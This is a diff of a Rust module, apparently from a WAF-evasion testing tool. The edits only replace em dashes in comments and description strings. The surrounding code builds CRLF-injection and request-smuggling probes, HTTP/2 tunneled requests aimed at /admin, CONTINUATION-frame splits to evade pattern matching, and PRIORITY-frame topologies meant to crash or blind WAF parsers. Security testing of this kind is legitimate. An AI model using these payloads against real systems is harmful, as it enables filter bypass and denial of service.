@@ -157,10 +157,10 @@ pub fn crlf_request_smuggle(path: &str, smuggled_path: &str) -> Result<H2Evasion
 /// Build a regular-header CRLF injection probe.
 ///
 /// **Deliberately unsanitised.** This function exists *to* produce
-/// CRLF-injected payloads — it's the technique under test, not a bug.
+/// CRLF-injected payloads (it's the technique under test, not a bug).
 /// Callers must only pass this through HTTP/2 codecs that tolerate
 /// the injection (HPACK rejects it; raw frame writers do not). For
-/// every other `H2Evasion` helper, header inputs ARE sanitised — see
+/// every other `H2Evasion` helper, header inputs ARE sanitised, see
 /// the contract on `authority_host_mismatch`.
 ///
 /// # Safety
@@ -218,13 +218,13 @@ pub fn mixed_case_headers() -> Vec<H2Evasion> {
 /// characters that would produce an invalid or injected header value
 /// (CRLF, null bytes, etc.). Previously both inputs silently fell back to
 /// an empty string on sanitization failure, generating probes with no host
-/// information — causing desync attempts against `""` instead of the
+/// information, causing desync attempts against `""` instead of the
 /// intended target.
 pub fn authority_host_mismatch(
     safe_host: &str,
     target_host: &str,
 ) -> Result<H2Evasion, H2EvasionError> {
-    // Sanitise both host inputs — every other public function in this
+    // Sanitise both host inputs, every other public function in this
     // module that takes user strings runs sanitize_input first, except
     // crlf_in_regular_header / crlf_in_pseudo_headers which deliberately
     // inject CRLF as the technique under test. Without this, a caller
@@ -313,7 +313,7 @@ pub fn split_pseudo_after_regular() -> ContinuationSplit {
     }
 }
 
-/// CONTINUATION N-split — distribute a payload header's bytes across
+/// CONTINUATION N-split, distribute a payload header's bytes across
 /// N CONTINUATION frames so a streaming WAF parser with a sliding-
 /// window pattern matcher misses contiguous patterns spanning frame
 /// boundaries. CVE-2024-27316 (Apache), CVE-2024-24549 (Tomcat),
@@ -322,7 +322,7 @@ pub fn split_pseudo_after_regular() -> ContinuationSplit {
 ///
 /// Existing `split_header_to_continuation` only does 1-into-1
 /// (entire payload header in a single CONTINUATION). This parameterised
-/// form lets MCTS sweep N=2..=10 — the right N is target-dependent.
+/// form lets MCTS sweep N=2..=10 (the right N is target-dependent).
 #[must_use]
 pub fn split_payload_across_n_continuations(
     payload_header: &str,
@@ -336,8 +336,8 @@ pub fn split_payload_across_n_continuations(
     // Snap a tentative byte offset to the nearest valid UTF-8 char
     // boundary at OR BELOW `idx`. Without this guard a payload like
     // "🎉🎉" (8 bytes, 2 chars) with n=3 produces chunk_len=3 and
-    // would slice `payload_value[0..3]` — mid-codepoint of the first
-    // 🎉 (4 bytes) — panicking the process. `is_char_boundary` is
+    // would slice `payload_value[0..3]`: mid-codepoint of the first
+    // 🎉 (4 bytes), panicking the process. `is_char_boundary` is
     // O(1); the inner loop runs at most 3 iterations (max UTF-8
     // continuation-byte distance).
     let floor_boundary = |idx: usize| -> usize {
@@ -382,7 +382,7 @@ pub fn split_payload_across_n_continuations(
             format!("x-cont-{i}")
         };
         // First frame carries the header NAME; subsequent frames
-        // continue the same header value via concatenation — HTTP/2
+        // continue the same header value via concatenation. HTTP/2
         // headers are atomic in the header block but a buggy parser
         // that re-emits header bytes across frames keeps the value
         // contiguous.
@@ -411,7 +411,7 @@ pub fn split_payload_across_n_continuations(
 /// to H1 to talk to origin AND injects auth headers
 /// (`X-SSL-VERIFIED`, `X-Frontend-Key`, `X-Real-IP`), wrapping a
 /// second HTTP/1.1 request inside a header NAME with embedded colons
-/// produces a tunneled request the WAF never inspected — the outer
+/// produces a tunneled request the WAF never inspected, the outer
 /// envelope gets the injected auth headers, the inner tunneled
 /// request does not. Distinct from `crlf_request_smuggle` which is
 /// CRLF-based.
@@ -428,7 +428,7 @@ pub fn h2_request_tunnel_colon_header_name(_inner_path: &str, _inner_host: &str)
     // tuning happens at the wire encoder.
     H2Evasion {
         name: "H2 Request Tunneling (colon-in-header-name)",
-        description: "Embed HTTP/1.1 request line+headers as an H2 header NAME with colons — outer envelope gets injected auth headers, inner tunneled request does not",
+        description: "Embed HTTP/1.1 request line+headers as an H2 header NAME with colons, outer envelope gets injected auth headers, inner tunneled request does not",
         headers: vec![(
             "GET /admin HTTP/1.1\r\nHost: internal\r\nX-Smuggled: true".into(),
             "v".into(),
@@ -893,7 +893,7 @@ pub fn all_evasions(path: &str, host: &str) -> Result<Vec<H2Evasion>, SafetyErro
         crlf_in_regular_header("user-agent", "Mozilla/5.0"),
         crlf_in_header_name("x", "foo: bar"),
     ];
-    // authority_host_mismatch / double_host now return Result — propagate
+    // authority_host_mismatch / double_host now return Result, propagate
     // the error (invalid host) mapped to the closest SafetyError variant
     // so the existing all_evasions signature stays stable.
     evasions.push(
@@ -957,7 +957,7 @@ pub struct H2PriorityFrame {
     pub description: String,
 }
 
-/// An SPCA attack descriptor — a collection of PRIORITY frames that
+/// An SPCA attack descriptor, a collection of PRIORITY frames that
 /// craft a specific dependency topology.
 #[derive(Debug, Clone)]
 pub struct SpcaTopology {
@@ -971,7 +971,7 @@ pub struct SpcaTopology {
 ///
 /// In a circular dependency A→B→C→A, RFC 7540 §5.3.1 says the new
 /// dependency MUST be ignored or reshuffled. However several WAF inline
-/// parsers walk the dependency pointer chain for scheduling decisions —
+/// parsers walk the dependency pointer chain for scheduling decisions 
 /// if they loop without a cycle-detection guard they either crash or
 /// silently truncate inspection. Streams 1, 3, 5, … are client-initiated;
 /// stream 0 is the connection control stream.
@@ -1008,7 +1008,7 @@ pub fn spca_circular_priority(n_streams: usize) -> SpcaTopology {
     }
     SpcaTopology {
         name: "SPCA Circular Priority",
-        description: "Circular PRIORITY dependency loop — WAF parsers without cycle detection \
+        description: "Circular PRIORITY dependency loop. WAF parsers without cycle detection \
                        loop forever or skip inspection; RFC 7540 §5.3.1 requires reshuffling",
         frames,
         target_flaw: H2TargetFlaw::FlowControl,
@@ -1024,7 +1024,7 @@ pub fn spca_circular_priority(n_streams: usize) -> SpcaTopology {
 pub fn spca_orphan_dependency(stream_id: u32, parent: u32) -> SpcaTopology {
     SpcaTopology {
         name: "SPCA Orphan Dependency",
-        description: "PRIORITY frame pointing at a closed/idle parent stream — \
+        description: "PRIORITY frame pointing at a closed/idle parent stream. \
                        WAFs that only inspect streams in the live-stream table miss this one",
         frames: vec![H2PriorityFrame {
             stream_id,
@@ -1037,7 +1037,7 @@ pub fn spca_orphan_dependency(stream_id: u32, parent: u32) -> SpcaTopology {
     }
 }
 
-/// Exclusive-weight storm — send a cascade of exclusive PRIORITY frames
+/// Exclusive-weight storm, send a cascade of exclusive PRIORITY frames
 /// that each claim to be the sole exclusive child of the root (stream 0).
 ///
 /// RFC 7540 §5.3.1: an exclusive flag moves all existing children of the
@@ -1051,7 +1051,7 @@ pub fn spca_exclusive_weight_storm() -> SpcaTopology {
     let mut frames: Vec<H2PriorityFrame> = Vec::new();
     // 16 exclusive PRIORITY frames → 16 tree rewrites per pass.
     // Every second frame is weight=0 (implementation-defined, often
-    // treated as weight=1 or rejected — both behaviours are interesting).
+    // treated as weight=1 or rejected (both behaviours are interesting)).
     for i in 0u32..16 {
         let stream_id = 2 * i + 1; // odd client-initiated
         frames.push(H2PriorityFrame {
@@ -1068,7 +1068,7 @@ pub fn spca_exclusive_weight_storm() -> SpcaTopology {
     }
     SpcaTopology {
         name: "SPCA Exclusive Weight Storm",
-        description: "16 exclusive PRIORITY frames targeting root — forces O(n²) tree rewrites \
+        description: "16 exclusive PRIORITY frames targeting root, forces O(n²) tree rewrites \
                        in WAF schedulers; alternating weight=0 tests implementation-defined behaviour",
         frames,
         target_flaw: H2TargetFlaw::FlowControl,
@@ -1097,7 +1097,7 @@ pub fn spca_deep_dependency_chain(depth: usize) -> SpcaTopology {
     }
     SpcaTopology {
         name: "SPCA Deep Dependency Chain",
-        description: "Linear dependency chain at maximum depth — triggers stack overflows \
+        description: "Linear dependency chain at maximum depth, triggers stack overflows \
                        in recursive WAF priority walkers",
         frames,
         target_flaw: H2TargetFlaw::FlowControl,
